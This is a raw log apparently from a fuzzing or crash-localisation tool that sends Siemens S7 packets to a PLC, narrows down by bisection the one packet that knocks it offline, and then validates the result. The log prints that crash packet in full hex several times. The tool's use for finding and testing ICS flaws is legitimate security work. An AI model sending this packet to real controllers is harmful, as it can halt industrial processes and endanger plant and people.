[2021-11-22 19:00:41,243] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004f01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:41,245] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005001000800080001120411440100ff090004001c0000
[2021-11-22 19:00:41,247] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005101000800080001120411440100ff090004001c0000
[2021-11-22 19:00:41,248] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005201000800080001120411440100ff090004001c0000
[2021-11-22 19:00:41,250] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005301000800080001120411440100ff090004001c0000
[2021-11-22 19:00:41,251] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005401000800080001120411440100ff090004001c0000
[2021-11-22 19:00:41,253] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005501000800080001120411440100ff090004001c0000
[2021-11-22 19:00:44,254] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 19:00:44,290] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 19:00:44,291] [INFO] [BLocate.locate] -> chosenPacket from 0 to 10 ; leftPackets from 10 to 20.
[2021-11-22 19:00:44,292] [INFO] [MyS7Client.connect] -> Close old socket!
[2021-11-22 19:00:44,292] [INFO] [MyS7Client.connect] -> Start connect PLC
[2021-11-22 19:00:44,684] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect request]0300001902f08032010000560100080000f000000a000a00f0
[2021-11-22 19:00:44,686] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300005601000800000000f0000003000300f0
[2021-11-22 19:00:44,688] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005701000800080001120411440100ff090004001c0000
[2021-11-22 19:00:44,691] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005801000800080001120411440100ff090004001c0000
[2021-11-22 19:00:45,161] [INFO] [MyS7Client.send_s7_packet] -> Send the crush packet
[2021-11-22 19:00:45,162] [INFO] [MyS7Client.send_s7_packet] -> [request]0300001f02f080320100005901000e00000401120a10010003000083000001
[2021-11-22 19:00:45,164] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005a01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:45,166] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005b01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:45,168] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005c01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:45,170] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005d01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:45,173] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005e01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:45,174] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005f01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:45,176] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700006001000800080001120411440100ff090004001c0000
[2021-11-22 19:00:48,181] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 19:00:50,209] [INFO] [MyS7Client.onlinePLC] -> the PLC is offline
[2021-11-22 19:00:50,210] [INFO] [BLocate.locate] -> find a crush
[2021-11-22 19:00:50,210] [INFO] [valition.handleCrush] -> handling crush
[2021-11-22 19:00:50,211] [INFO] [valition.__closePlugin] -> trying to switch off the plugin
[2021-11-22 19:00:50,491] [INFO] [valition.__closePlugin] -> Switch off Plugin success!
[2021-11-22 19:00:52,501] [INFO] [valition.__openPlugin] -> trying to switch on the plugin
[2021-11-22 19:00:52,737] [INFO] [valition.__openPlugin] -> Switch on the Plugin success!
[2021-11-22 19:00:52,738] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 19:01:00,785] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 19:01:00,786] [INFO] [BLocate.locate] -> chosenPacket from 0 to 5 ; leftPackets from 5 to 10.
[2021-11-22 19:01:00,788] [INFO] [MyS7Client.connect] -> Close old socket!
[2021-11-22 19:01:00,789] [INFO] [MyS7Client.connect] -> Start connect PLC
[2021-11-22 19:01:00,961] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect request]0300001902f08032010000610100080000f000000a000a00f0
[2021-11-22 19:01:00,961] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300006101000800000000f0000003000300f0
[2021-11-22 19:01:00,963] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700006201000800080001120411440100ff090004001c0000
[2021-11-22 19:01:00,964] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700006301000800080001120411440100ff090004001c0000
[2021-11-22 19:01:01,338] [INFO] [MyS7Client.send_s7_packet] -> Send the crush packet
[2021-11-22 19:01:01,339] [INFO] [MyS7Client.send_s7_packet] -> [request]0300001f02f080320100006401000e00000401120a10010003000083000001
[2021-11-22 19:01:01,341] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700006501000800080001120411440100ff090004001c0000
[2021-11-22 19:01:01,343] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700006601000800080001120411440100ff090004001c0000
[2021-11-22 19:01:04,359] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 19:01:06,385] [INFO] [MyS7Client.onlinePLC] -> the PLC is offline
[2021-11-22 19:01:06,386] [INFO] [BLocate.locate] -> find a crush
[2021-11-22 19:01:06,387] [INFO] [valition.handleCrush] -> handling crush
[2021-11-22 19:01:06,388] [INFO] [valition.__closePlugin] -> trying to switch off the plugin
[2021-11-22 19:01:06,648] [INFO] [valition.__closePlugin] -> Switch off Plugin success!
[2021-11-22 19:01:08,649] [INFO] [valition.__openPlugin] -> trying to switch on the plugin
[2021-11-22 19:01:08,897] [INFO] [valition.__openPlugin] -> Switch on the Plugin success!
[2021-11-22 19:01:08,898] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 19:01:16,925] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 19:01:16,926] [INFO] [BLocate.locate] -> chosenPacket from 0 to 2 ; leftPackets from 2 to 5.
[2021-11-22 19:01:16,927] [INFO] [MyS7Client.connect] -> Close old socket!
[2021-11-22 19:01:16,927] [INFO] [MyS7Client.connect] -> Start connect PLC
[2021-11-22 19:01:16,968] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect request]0300001902f08032010000670100080000f000000a000a00f0
[2021-11-22 19:01:16,969] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300006701000800000000f0000003000300f0
[2021-11-22 19:01:16,971] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700006801000800080001120411440100ff090004001c0000
[2021-11-22 19:01:16,973] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700006901000800080001120411440100ff090004001c0000
[2021-11-22 19:01:19,978] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 19:01:19,990] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 19:01:19,990] [INFO] [BLocate.locate] -> chosenPacket from 0 to 1 ; leftPackets from 1 to 3.
[2021-11-22 19:01:19,991] [INFO] [MyS7Client.connect] -> Close old socket!
[2021-11-22 19:01:19,992] [INFO] [MyS7Client.connect] -> Start connect PLC
[2021-11-22 19:01:21,093] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect request]0300001902f080320100006a0100080000f000000a000a00f0
[2021-11-22 19:01:21,094] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300006a01000800000000f0000003000300f0
[2021-11-22 19:01:21,527] [INFO] [MyS7Client.send_s7_packet] -> Send the crush packet
[2021-11-22 19:01:21,528] [INFO] [MyS7Client.send_s7_packet] -> [request]0300001f02f080320100006b01000e00000401120a10010003000083000001
[2021-11-22 19:01:24,534] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 19:01:26,564] [INFO] [MyS7Client.onlinePLC] -> the PLC is offline
[2021-11-22 19:01:26,565] [INFO] [BLocate.locate] -> find a crush
[2021-11-22 19:01:26,566] [INFO] [valition.handleCrush] -> handling crush
[2021-11-22 19:01:26,568] [INFO] [valition.__closePlugin] -> trying to switch off the plugin
[2021-11-22 19:01:26,918] [INFO] [valition.__closePlugin] -> Switch off Plugin success!
[2021-11-22 19:01:28,921] [INFO] [valition.__openPlugin] -> trying to switch on the plugin
[2021-11-22 19:01:29,260] [INFO] [valition.__openPlugin] -> Switch on the Plugin success!
[2021-11-22 19:01:29,261] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 19:01:37,313] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 19:01:37,314] [INFO] [BLocate.locate] -> Crush Packet is 0300001f02f080320100006b01000e00000401120a10010003000083000001
[2021-11-22 19:01:37,316] [INFO] [valition.<module>] -> The true crush number is 188, the finded crush number is 188
[2021-11-22 19:01:37,317] [INFO] [valition.<module>] -> Will send 1000 packets, the crush packet is 87
[2021-11-22 19:01:37,317] [INFO] [MyS7Client.connect] -> Close old socket!
[2021-11-22 19:01:37,318] [INFO] [MyS7Client.connect] -> Start connect PLC
[2021-11-22 19:01:37,482] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect request]0300001902f080320100006c0100080000f000000a000a00f0
[2021-11-22 19:01:37,484] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300006c01000800000000f0000003000300f0
[2021-11-22 19:01:37,491] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700006d01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:37,492] [INFO] [MyS7Client.findArpPacket] -> passive detected a probable crush e0dca0439b86e0e1a91549c508060001080006040001e0e1a91549c5c0a80189e0dca0439b86c0a801bc
[2021-11-22 19:01:37,698] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 19:01:37,724] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 19:01:37,726] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700006e01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:37,933] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700006f01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:38,149] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007001000800080001120411440100ff090004001c0000
[2021-11-22 19:01:38,355] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007101000800080001120411440100ff090004001c0000
[2021-11-22 19:01:38,558] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007201000800080001120411440100ff090004001c0000
[2021-11-22 19:01:38,761] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007301000800080001120411440100ff090004001c0000
[2021-11-22 19:01:38,967] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007401000800080001120411440100ff090004001c0000
[2021-11-22 19:01:39,174] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007501000800080001120411440100ff090004001c0000
[2021-11-22 19:01:39,382] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007601000800080001120411440100ff090004001c0000
[2021-11-22 19:01:39,586] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007701000800080001120411440100ff090004001c0000
[2021-11-22 19:01:39,792] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007801000800080001120411440100ff090004001c0000
[2021-11-22 19:01:40,008] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007901000800080001120411440100ff090004001c0000
[2021-11-22 19:01:40,214] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007a01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:40,417] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007b01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:40,622] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007c01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:40,827] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007d01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:41,033] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007e01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:41,237] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007f01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:41,439] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008001000800080001120411440100ff090004001c0000
[2021-11-22 19:01:41,658] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008101000800080001120411440100ff090004001c0000
[2021-11-22 19:01:41,859] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008201000800080001120411440100ff090004001c0000
[2021-11-22 19:01:42,062] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008301000800080001120411440100ff090004001c0000
[2021-11-22 19:01:42,264] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008401000800080001120411440100ff090004001c0000
[2021-11-22 19:01:42,481] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008501000800080001120411440100ff090004001c0000
[2021-11-22 19:01:42,687] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008601000800080001120411440100ff090004001c0000
[2021-11-22 19:01:42,891] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008701000800080001120411440100ff090004001c0000
[2021-11-22 19:01:43,096] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008801000800080001120411440100ff090004001c0000
[2021-11-22 19:01:43,304] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008901000800080001120411440100ff090004001c0000
[2021-11-22 19:01:43,521] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008a01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:43,728] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008b01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:43,935] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008c01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:44,143] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008d01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:44,346] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008e01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:44,550] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008f01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:44,757] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009001000800080001120411440100ff090004001c0000
[2021-11-22 19:01:44,804] [INFO] [MyS7Client.findArpPacket] -> passive detected a probable crush e0dca0439b86e0e1a91549c508060001080006040001e0e1a91549c5c0a80189e0dca0439b86c0a801bc
[2021-11-22 19:01:44,959] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 19:01:44,968] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 19:01:44,969] [INFO] [MyS7Client.findArpPacket] -> passive detected a probable crush e0dca0439b86e0e1a91549c508060001080006040001e0e1a91549c5c0a80189e0dca0439b86c0a801bc
[2021-11-22 19:01:44,970] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009101000800080001120411440100ff090004001c0000
[2021-11-22 19:01:45,176] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 19:01:45,192] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 19:01:45,194] [INFO] [MyS7Client.findArpPacket] -> passive detected a probable crush e0dca0439b86e0e1a91549c508060001080006040001e0e1a91549c5c0a80189e0dca0439b86c0a801bc
[2021-11-22 19:01:45,194] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009201000800080001120411440100ff090004001c0000
[2021-11-22 19:01:45,410] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 19:01:45,440] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 19:01:45,443] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009301000800080001120411440100ff090004001c0000
[2021-11-22 19:01:45,444] [INFO] [MyS7Client.findArpPacket] -> passive detected a probable crush e0dca0439b86e0e1a91549c508060001080006040001e0e1a91549c5c0a80189e0dca0439b86c0a801bc
[2021-11-22 19:01:45,644] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 19:01:45,674] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 19:01:45,681] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009401000800080001120411440100ff090004001c0000
[2021-11-22 19:01:45,682] [INFO] [MyS7Client.findArpPacket] -> passive detected a probable crush e0dca0439b86e0e1a91549c508060001080006040001e0e1a91549c5c0a80189e0dca0439b86c0a801bc
[2021-11-22 19:01:45,896] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 19:01:45,913] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 19:01:45,915] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009501000800080001120411440100ff090004001c0000
[2021-11-22 19:01:46,131] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009601000800080001120411440100ff090004001c0000
[2021-11-22 19:01:46,347] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009701000800080001120411440100ff090004001c0000
[2021-11-22 19:01:46,552] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009801000800080001120411440100ff090004001c0000
[2021-11-22 19:01:46,758] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009901000800080001120411440100ff090004001c0000
[2021-11-22 19:01:46,963] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009a01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:47,170] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009b01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:47,374] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009c01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:47,578] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009d01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:47,781] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009e01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:47,989] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009f01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:48,196] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000a001000800080001120411440100ff090004001c0000
[2021-11-22 19:01:48,402] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000a101000800080001120411440100ff090004001c0000
[2021-11-22 19:01:48,607] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000a201000800080001120411440100ff090004001c0000
[2021-11-22 19:01:48,812] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000a301000800080001120411440100ff090004001c0000
[2021-11-22 19:01:49,020] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000a401000800080001120411440100ff090004001c0000
[2021-11-22 19:01:49,226] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000a501000800080001120411440100ff090004001c0000
[2021-11-22 19:01:49,443] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000a601000800080001120411440100ff090004001c0000
[2021-11-22 19:01:49,650] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000a701000800080001120411440100ff090004001c0000
[2021-11-22 19:01:49,853] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000a801000800080001120411440100ff090004001c0000
[2021-11-22 19:01:50,057] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000a901000800080001120411440100ff090004001c0000
[2021-11-22 19:01:50,263] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000aa01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:50,465] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000ab01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:50,668] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000ac01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:50,875] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000ad01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:51,081] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000ae01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:51,290] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000af01000800080001120411440100ff090004001c0000
[2021-11-22 19:01:51,492] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000b001000800080001120411440100ff090004001c0000
[2021-11-22 19:01:51,700] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000b101000800080001120411440100ff090004001c0000
[2021-11-22 19:01:51,907] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000b201000800080001120411440100ff090004001c0000
[2021-11-22 19:01:52,112] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000b301000800080001120411440100ff090004001c0000
[2021-11-22 19:01:52,319] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000b401000800080001120411440100ff090004001c0000
[2021-11-22 19:01:52,527] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000b501000800080001120411440100ff090004001c0000
[2021-11-22 19:01:52,733] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000b601000800080001120411440100ff090004001c0000
[2021-11-22 19:01:52,950] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000b701000800080001120411440100ff090004001c0000
[2021-11-22 19:01:53,163] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000b801000800080001120411440100ff090004001c0000
